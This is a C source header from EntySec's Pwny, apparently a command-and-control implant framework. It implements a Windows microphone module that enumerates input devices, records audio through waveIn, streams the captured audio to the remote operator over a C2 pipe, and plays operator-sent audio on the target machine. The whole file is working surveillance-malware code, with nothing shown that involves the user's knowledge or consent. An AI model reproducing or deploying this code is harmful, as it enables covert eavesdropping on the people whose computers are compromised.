/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _MIC_H_
#define _MIC_H_

#include <windows.h>
#include <mmsystem.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define MIC_BASE 9

#define MIC_PLAY \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       MIC_BASE, \
                       API_CALL)

#define MIC_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       MIC_BASE, \
                       API_CALL + 1)

#define MIC_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        MIC_BASE, \
                        PIPE_TYPE)

#define TLV_TYPE_MIC_ID   TLV_TYPE_CUSTOM(TLV_TYPE_INT, MIC_BASE, API_TYPE)
#define TLV_TYPE_RATE     TLV_TYPE_CUSTOM(TLV_TYPE_INT, MIC_BASE, API_TYPE + 1)
#define TLV_TYPE_CHANNELS TLV_TYPE_CUSTOM(TLV_TYPE_INT, MIC_BASE, API_TYPE + 2)

#define MIC_NUM_BUFFERS 4
#define MIC_BUFFER_SIZE 8192

typedef struct
{
    HWAVEIN hWaveIn;
    WAVEHDR waveHdr[MIC_NUM_BUFFERS];
    unsigned char *buffers[MIC_NUM_BUFFERS];

    CRITICAL_SECTION cs;
    unsigned char *read_buf;
    DWORD read_size;
    DWORD read_pos;
    int ready;
} mic_t;

static void CALLBACK mic_wave_in_proc(HWAVEIN hwi, UINT uMsg,
                                       DWORD_PTR dwInstance,
                                       DWORD_PTR dwParam1,
                                       DWORD_PTR dwParam2)
{
    mic_t *mic;
    WAVEHDR *hdr;

    if (uMsg != WIM_DATA)
    {
        return;
    }

    mic = (mic_t *)dwInstance;
    hdr = (WAVEHDR *)dwParam1;

    if (hdr->dwBytesRecorded == 0)
    {
        return;
    }

    EnterCriticalSection(&mic->cs);

    if (mic->read_buf != NULL)
    {
        free(mic->read_buf);
    }

    mic->read_buf = (unsigned char *)malloc(hdr->dwBytesRecorded);
    if (mic->read_buf != NULL)
    {
        memcpy(mic->read_buf, hdr->lpData, hdr->dwBytesRecorded);
        mic->read_size = hdr->dwBytesRecorded;
        mic->read_pos = 0;
        mic->ready = 1;
    }

    LeaveCriticalSection(&mic->cs);

    waveInAddBuffer(hwi, hdr, sizeof(WAVEHDR));
}

static tlv_pkt_t *mic_list(c2_t *c2)
{
    UINT count;
    UINT iter;
    WAVEINCAPSA caps;
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    count = waveInGetNumDevs();

    for (iter = 0; iter < count; iter++)
    {
        if (waveInGetDevCapsA(iter, &caps, sizeof(caps)) == MMSYSERR_NOERROR)
        {
            tlv_pkt_add_string(result, TLV_TYPE_STRING, caps.szPname);
        }
    }

    return result;
}

static tlv_pkt_t *mic_play(c2_t *c2)
{
    /* Play raw audio data through the default output device.
     *
     * :in bytes(TLV_TYPE_BYTES): raw audio data (WAV)
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     */

    int size;
    unsigned char *buffer;

    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &buffer);
    if (size <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!PlaySoundA((LPCSTR)buffer, NULL, SND_MEMORY | SND_SYNC))
    {
        free(buffer);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    free(buffer);
    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static int mic_create(pipe_t *pipe, c2_t *c2)
{
    int device;
    int channels;
    int rate;
    int iter;

    WAVEFORMATEX wfx;
    MMRESULT mr;
    mic_t *mic;

    device = 0;
    channels = 1;
    rate = 44100;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_MIC_ID, &device);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_CHANNELS, &channels);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_RATE, &rate);

    mic = (mic_t *)calloc(1, sizeof(*mic));
    if (mic == NULL)
    {
        return -1;
    }

    InitializeCriticalSection(&mic->cs);
    mic->read_buf = NULL;
    mic->read_size = 0;
    mic->read_pos = 0;
    mic->ready = 0;

    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = (WORD)channels;
    wfx.nSamplesPerSec = (DWORD)rate;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;

    mr = waveInOpen(&mic->hWaveIn, (UINT)device, &wfx,
                    (DWORD_PTR)mic_wave_in_proc,
                    (DWORD_PTR)mic, CALLBACK_FUNCTION);

    if (mr != MMSYSERR_NOERROR)
    {
        log_debug("* waveInOpen failed (%d)\n", mr);
        DeleteCriticalSection(&mic->cs);
        free(mic);
        return -1;
    }

    for (iter = 0; iter < MIC_NUM_BUFFERS; iter++)
    {
        mic->buffers[iter] = (unsigned char *)calloc(1, MIC_BUFFER_SIZE);
        if (mic->buffers[iter] == NULL)
        {
            goto fail;
        }

        mic->waveHdr[iter].lpData = (LPSTR)mic->buffers[iter];
        mic->waveHdr[iter].dwBufferLength = MIC_BUFFER_SIZE;

        waveInPrepareHeader(mic->hWaveIn, &mic->waveHdr[iter], sizeof(WAVEHDR));
        waveInAddBuffer(mic->hWaveIn, &mic->waveHdr[iter], sizeof(WAVEHDR));
    }

    mr = waveInStart(mic->hWaveIn);
    if (mr != MMSYSERR_NOERROR)
    {
        log_debug("* waveInStart failed (%d)\n", mr);
        goto fail;
    }

    pipe->data = mic;
    return 0;

fail:
    waveInClose(mic->hWaveIn);
    for (iter = 0; iter < MIC_NUM_BUFFERS; iter++)
    {
        if (mic->buffers[iter])
        {
            free(mic->buffers[iter]);
        }
    }
    DeleteCriticalSection(&mic->cs);
    free(mic);
    return -1;
}

static int mic_read(pipe_t *pipe, void *buffer, int length)
{
    mic_t *mic;
    int copied;

    mic = (mic_t *)pipe->data;
    copied = 0;

    EnterCriticalSection(&mic->cs);

    if (mic->ready && mic->read_buf != NULL)
    {
        copied = (int)(mic->read_size - mic->read_pos);
        if (copied > length)
        {
            copied = length;
        }

        memcpy(buffer, mic->read_buf + mic->read_pos, copied);
        mic->read_pos += copied;

        if (mic->read_pos >= mic->read_size)
        {
            free(mic->read_buf);
            mic->read_buf = NULL;
            mic->read_size = 0;
            mic->read_pos = 0;
            mic->ready = 0;
        }
    }

    LeaveCriticalSection(&mic->cs);

    if (copied == 0)
    {
        Sleep(10);
    }

    return copied;
}

static int mic_destroy(pipe_t *pipe, c2_t *c2)
{
    mic_t *mic;
    int iter;

    mic = (mic_t *)pipe->data;

    waveInStop(mic->hWaveIn);
    waveInReset(mic->hWaveIn);

    for (iter = 0; iter < MIC_NUM_BUFFERS; iter++)
    {
        waveInUnprepareHeader(mic->hWaveIn, &mic->waveHdr[iter], sizeof(WAVEHDR));
        if (mic->buffers[iter])
        {
            free(mic->buffers[iter]);
        }
    }

    waveInClose(mic->hWaveIn);

    EnterCriticalSection(&mic->cs);
    if (mic->read_buf)
    {
        free(mic->read_buf);
    }
    LeaveCriticalSection(&mic->cs);

    DeleteCriticalSection(&mic->cs);
    free(mic);

    return 0;
}

void register_mic_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, MIC_PLAY, mic_play);
    api_call_register(api_calls, MIC_LIST, mic_list);
}

void register_mic_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t callbacks;

    memset(&callbacks, 0, sizeof(callbacks));
    callbacks.create_cb = mic_create;
    callbacks.read_cb = mic_read;
    callbacks.destroy_cb = mic_destroy;

    api_pipe_register(pipes, MIC_PIPE, callbacks);
}

#endif
